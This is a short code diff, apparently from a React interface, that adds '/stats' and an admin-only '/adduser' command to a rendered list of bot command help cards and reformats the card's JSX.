+              { cmd: "/stats", desc: "View bot & device stats" },
+              {
+                cmd: "/adduser ID days email pass",
+                desc: "Add new user (admin only)",
+              },
             ].map(({ cmd, desc }) => (
-              <div key={cmd} className="bg-muted border border-card-border rounded-2xl p-3">
+              <div
+                key={cmd}
+                className="bg-muted border border-card-border rounded-2xl p-3"
+              >
                 <p className="text-muted-foreground text-xs mb-1">{desc}</p>
                 <code className="text-primary font-mono text-xs">{cmd}</code>
               </div>
